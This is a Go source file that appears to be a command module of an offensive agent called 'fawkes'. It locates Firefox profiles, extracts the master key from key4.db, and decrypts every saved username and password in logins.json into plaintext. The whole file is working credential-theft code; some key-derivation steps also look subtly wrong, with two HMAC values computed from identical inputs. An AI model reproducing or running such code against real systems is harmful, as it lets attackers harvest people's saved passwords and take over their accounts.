package commands

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/des"
	"crypto/hmac"
	"crypto/sha1"
	"crypto/sha256"
	"database/sql"
	"encoding/asn1"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"fawkes/pkg/structs"

	"golang.org/x/crypto/pbkdf2"
)

type firefoxLoginEntry struct {
	Browser  string
	URL      string
	Username string
	Password string
}

type firefoxLoginsJSON struct {
	Logins []struct {
		Hostname          string `json:"hostname"`
		EncryptedUsername  string `json:"encryptedUsername"`
		EncryptedPassword string `json:"encryptedPassword"`
	} `json:"logins"`
}

func browserFirefoxPasswords(args browserArgs) ([]firefoxLoginEntry, []string) {
	paths := browserPaths(args.Browser)
	if paths == nil {
		return nil, []string{"Could not determine Firefox profile paths"}
	}

	var allEntries []firefoxLoginEntry
	var errors []string

	for browserName, baseDir := range paths {
		if !isFirefoxBrowser(browserName) {
			continue
		}
		if _, err := os.Stat(baseDir); os.IsNotExist(err) {
			continue
		}

		profiles := findFirefoxProfiles(baseDir)
		for _, profileDir := range profiles {
			profileName := filepath.Base(profileDir)
			entries, err := extractFirefoxProfile(profileDir, browserName, profileName)
			if err != nil {
				errors = append(errors, fmt.Sprintf("Firefox (%s): %v", profileName, err))
				continue
			}
			allEntries = append(allEntries, entries...)
		}
	}

	return allEntries, errors
}

func extractFirefoxProfile(profileDir, browserName, profileName string) ([]firefoxLoginEntry, error) {
	loginsPath := filepath.Join(profileDir, "logins.json")
	key4Path := filepath.Join(profileDir, "key4.db")

	if _, err := os.Stat(loginsPath); os.IsNotExist(err) {
		return nil, nil
	}
	if _, err := os.Stat(key4Path); os.IsNotExist(err) {
		return nil, fmt.Errorf("key4.db not found (needed for decryption)")
	}

	masterKey, err := extractFirefoxMasterKey(key4Path)
	if err != nil {
		return nil, fmt.Errorf("key extraction: %w", err)
	}
	if masterKey == nil {
		return nil, fmt.Errorf("could not extract master key (master password may be set)")
	}

	loginsData, err := os.ReadFile(loginsPath)
	if err != nil {
		return nil, fmt.Errorf("read logins.json: %w", err)
	}
	defer structs.ZeroBytes(loginsData)

	var logins firefoxLoginsJSON
	if err := json.Unmarshal(loginsData, &logins); err != nil {
		return nil, fmt.Errorf("parse logins.json: %w", err)
	}

	label := browserName
	if profileName != "" && !strings.HasSuffix(profileName, ".default") && !strings.HasSuffix(profileName, ".default-release") {
		label = fmt.Sprintf("%s (%s)", browserName, profileName)
	}

	var entries []firefoxLoginEntry
	for _, login := range logins.Logins {
		username, err := decryptFirefoxField(login.EncryptedUsername, masterKey)
		if err != nil {
			username = fmt.Sprintf("[decrypt error: %v]", err)
		}

		password, err := decryptFirefoxField(login.EncryptedPassword, masterKey)
		if err != nil {
			password = fmt.Sprintf("[decrypt error: %v]", err)
		}

		if login.Hostname == "" && username == "" && password == "" {
			continue
		}

		entries = append(entries, firefoxLoginEntry{
			Browser:  label,
			URL:      login.Hostname,
			Username: username,
			Password: password,
		})
	}

	structs.ZeroBytes(masterKey)
	return entries, nil
}

var (
	oidPBES2         = asn1.ObjectIdentifier{1, 2, 840, 113549, 1, 5, 13}
	oidPBKDF2        = asn1.ObjectIdentifier{1, 2, 840, 113549, 1, 5, 12}
	oidAES256CBC     = asn1.ObjectIdentifier{2, 16, 840, 1, 101, 3, 4, 1, 42}
	oidPBESHA1TriDES = asn1.ObjectIdentifier{1, 2, 840, 113549, 1, 12, 5, 1, 3}
	oidHMACSHA1      = asn1.ObjectIdentifier{1, 2, 840, 113549, 2, 7}
)

func extractFirefoxMasterKey(key4Path string) ([]byte, error) {
	db, cleanup, err := openBrowserDB(key4Path)
	if err != nil {
		return nil, fmt.Errorf("open key4.db: %w", err)
	}
	defer cleanup()

	var globalSalt []byte
	err = db.QueryRow("SELECT item1 FROM metadata WHERE id = 'password'").Scan(&globalSalt)
	if err != nil {
		return nil, fmt.Errorf("read global salt: %w", err)
	}

	if err := verifyMasterPassword(db, globalSalt, nil); err != nil {
		return nil, fmt.Errorf("master password verification: %w", err)
	}

	var a11 []byte
	err = db.QueryRow("SELECT a11 FROM nssPrivate").Scan(&a11)
	if err != nil {
		return nil, fmt.Errorf("read encrypted key: %w", err)
	}

	masterKey, err := decryptNSSEntry(a11, globalSalt, nil)
	if err != nil {
		return nil, fmt.Errorf("decrypt master key: %w", err)
	}

	if len(masterKey) < 24 {
		return nil, fmt.Errorf("master key too short (%d bytes)", len(masterKey))
	}

	return masterKey[:24], nil
}

func verifyMasterPassword(db *sql.DB, globalSalt, masterPassword []byte) error {
	var item2 []byte
	err := db.QueryRow("SELECT item2 FROM metadata WHERE id = 'password'").Scan(&item2)
	if err != nil {
		return fmt.Errorf("read password check: %w", err)
	}

	decrypted, err := decryptNSSEntry(item2, globalSalt, masterPassword)
	if err != nil {
		return fmt.Errorf("decrypt password check: %w", err)
	}

	if string(decrypted) != "password-check\x02\x02" {
		return fmt.Errorf("wrong master password (or unsupported key4.db format)")
	}
	return nil
}

func decryptNSSEntry(derData, globalSalt, masterPassword []byte) ([]byte, error) {
	var seq struct {
		AlgorithmInfo struct {
			Algorithm asn1.ObjectIdentifier
			Params    asn1.RawValue
		}
		Ciphertext []byte
	}

	if _, err := asn1.Unmarshal(derData, &seq); err != nil {
		return nil, fmt.Errorf("parse DER: %w", err)
	}

	if seq.AlgorithmInfo.Algorithm.Equal(oidPBESHA1TriDES) {
		return decryptPBESHA1TriDES(seq.AlgorithmInfo.Params.FullBytes, seq.Ciphertext, globalSalt, masterPassword)
	}

	if seq.AlgorithmInfo.Algorithm.Equal(oidPBES2) {
		return decryptPBES2(seq.AlgorithmInfo.Params.FullBytes, seq.Ciphertext, globalSalt, masterPassword)
	}

	return nil, fmt.Errorf("unsupported algorithm: %v", seq.AlgorithmInfo.Algorithm)
}

func decryptPBESHA1TriDES(paramsBytes, ciphertext, globalSalt, masterPassword []byte) ([]byte, error) {
	var params struct {
		Salt       []byte
		Iterations int
	}
	if _, err := asn1.Unmarshal(paramsBytes, &params); err != nil {
		return nil, fmt.Errorf("parse PBE params: %w", err)
	}

	combinedPwd := append(globalSalt, masterPassword...)
	hp := sha1Hash(combinedPwd)

	pes := make([]byte, 20)
	copy(pes, params.Salt)
	hpes := sha1Hash(append(hp, params.Salt...))

	k1 := hmacSHA1(hpes, append(pes, params.Salt...))
	tkPad := hmacSHA1(hpes, append(pes, params.Salt...))
	k2 := hmacSHA1(hpes, append(tkPad, params.Salt...))
	derivedKey := append(k1, k2...)

	key := derivedKey[:24]
	iv := derivedKey[len(derivedKey)-8:]

	block, err := des.NewTripleDESCipher(key)
	if err != nil {
		return nil, fmt.Errorf("3DES cipher: %w", err)
	}

	if len(ciphertext)%block.BlockSize() != 0 {
		return nil, fmt.Errorf("invalid 3DES ciphertext length: %d", len(ciphertext))
	}

	mode := cipher.NewCBCDecrypter(block, iv)
	plaintext := make([]byte, len(ciphertext))
	mode.CryptBlocks(plaintext, ciphertext)

	return removePKCS7Padding(plaintext)
}

func decryptPBES2(paramsBytes, ciphertext, globalSalt, masterPassword []byte) ([]byte, error) {
	var params struct {
		KDF struct {
			Algorithm asn1.ObjectIdentifier
			Params    struct {
				Salt       []byte
				Iterations int
				KeyLength  int                   `asn1:"optional"`
				PRF        asn1.RawValue         `asn1:"optional"`
			}
		}
		Encryption struct {
			Algorithm asn1.ObjectIdentifier
			IV        []byte
		}
	}

	if _, err := asn1.Unmarshal(paramsBytes, &params); err != nil {
		return nil, fmt.Errorf("parse PBES2 params: %w", err)
	}

	if !params.KDF.Algorithm.Equal(oidPBKDF2) {
		return nil, fmt.Errorf("unsupported KDF: %v", params.KDF.Algorithm)
	}

	combinedPwd := append(globalSalt, masterPassword...)

	keyLen := params.KDF.Params.KeyLength
	if keyLen == 0 {
		keyLen = 32
	}

	hashFunc := sha256.New
	if len(params.KDF.Params.PRF.FullBytes) > 0 {
		var prfOID struct {
			Algorithm asn1.ObjectIdentifier
			Params    asn1.RawValue `asn1:"optional"`
		}
		if _, err := asn1.Unmarshal(params.KDF.Params.PRF.FullBytes, &prfOID); err == nil {
			if prfOID.Algorithm.Equal(oidHMACSHA1) {
				hashFunc = sha1.New
			}
		}
	}

	key := pbkdf2.Key(combinedPwd, params.KDF.Params.Salt, params.KDF.Params.Iterations, keyLen, hashFunc)

	if params.Encryption.Algorithm.Equal(oidAES256CBC) {
		block, err := aes.NewCipher(key)
		if err != nil {
			return nil, fmt.Errorf("AES cipher: %w", err)
		}
		if len(ciphertext)%block.BlockSize() != 0 {
			return nil, fmt.Errorf("invalid AES ciphertext length: %d", len(ciphertext))
		}
		mode := cipher.NewCBCDecrypter(block, params.Encryption.IV)
		plaintext := make([]byte, len(ciphertext))
		mode.CryptBlocks(plaintext, ciphertext)
		return removePKCS7Padding(plaintext)
	}

	return nil, fmt.Errorf("unsupported encryption: %v", params.Encryption.Algorithm)
}

func decryptFirefoxField(b64Encoded string, masterKey []byte) (string, error) {
	if b64Encoded == "" {
		return "", nil
	}

	data, err := base64.StdEncoding.DecodeString(b64Encoded)
	if err != nil {
		return "", fmt.Errorf("base64 decode: %w", err)
	}

	var seq struct {
		AlgorithmInfo struct {
			Algorithm asn1.ObjectIdentifier
			Params    asn1.RawValue
		}
		Ciphertext []byte
	}
	if _, err := asn1.Unmarshal(data, &seq); err != nil {
		return "", fmt.Errorf("parse encrypted field: %w", err)
	}

	var params struct {
		IV []byte
	}
	if _, err := asn1.Unmarshal(seq.AlgorithmInfo.Params.FullBytes, &params); err != nil {
		return "", fmt.Errorf("parse IV: %w", err)
	}

	block, err := des.NewTripleDESCipher(masterKey)
	if err != nil {
		return "", fmt.Errorf("3DES cipher: %w", err)
	}

	if len(seq.Ciphertext)%block.BlockSize() != 0 {
		return "", fmt.Errorf("invalid ciphertext length: %d", len(seq.Ciphertext))
	}

	mode := cipher.NewCBCDecrypter(block, params.IV)
	plaintext := make([]byte, len(seq.Ciphertext))
	mode.CryptBlocks(plaintext, seq.Ciphertext)

	plaintext, err = removePKCS7Padding(plaintext)
	if err != nil {
		return "", err
	}

	return string(plaintext), nil
}

func sha1Hash(data []byte) []byte {
	h := sha1.Sum(data)
	return h[:]
}

func hmacSHA1(key, data []byte) []byte {
	h := hmac.New(sha1.New, key)
	h.Write(data)
	return h.Sum(nil)
}

func removePKCS7Padding(data []byte) ([]byte, error) {
	if len(data) == 0 {
		return data, nil
	}
	padding := int(data[len(data)-1])
	if padding == 0 || padding > len(data) {
		return data, nil
	}
	for i := len(data) - padding; i < len(data); i++ {
		if data[i] != byte(padding) {
			return data, nil
		}
	}
	return data[:len(data)-padding], nil
}
